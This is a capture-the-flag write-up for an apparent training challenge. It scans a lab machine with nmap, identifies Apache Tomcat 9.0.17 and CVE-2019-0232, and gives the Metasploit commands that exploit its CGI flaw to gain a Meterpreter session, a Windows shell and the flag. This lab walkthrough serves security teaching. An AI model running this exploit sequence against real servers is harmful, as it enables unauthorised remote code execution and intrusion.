# [Day 12] Networking - Ready, set, elf

## Topics

- Vulnerabilities
- CGI (Common Gateway Interface)
- Metasploit

### 1. What is the version number of the web server?
```
9.0.17
```
First, we'll do a simple nmap scan `nmap 10.10.x.x -sV -T4`

__important output:__
```
Not shown: 996 filtered ports
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
8080/tcp open  http-proxy
```
From this, we can assume the webserver is going through the proxy in port 8080, so we enter the URL `10.10.x.x:8080`.\
When you enter, you should see version `Apache Tomcat/9.0.17`

### 2. What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)
```
CVE-2019-0232
```
By just googling `Apache Tomcat/9.0.17 cve` you should find a cve details page, and one of the cve in the list should be the one we are looking for.

### 3. Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.

1. Activate the metasploit console with `msfconsole`. 
2. Once on metasploit, use the exploit that we found `use exploit/windows/http/tomcat_cgi_cmdlineargs`
3. Check the `options` that we have to set:
    - `set RHOSTS [TARGET_MACHINE_IP]`
    - `set RPORT 8080`
    - `set TARGETURI http://10.10.x.x:8080/cgi-bin/elfwhacker.bat`
        - The targte URI can be found by reading the explanation and the challenge prompt
4. Once all the options are set, exploit it with `exploit`
5. After it finishes, you should have meterpreter available. Activate a shell with `shell`
6. You should get a Windows shell. To list all files and directories, use `dir`. The flag should be found in the same directory you are dropped in at first.

### 4. What are the contents of flag1.txt?

To view the contents of a file, use `type flag1.txt`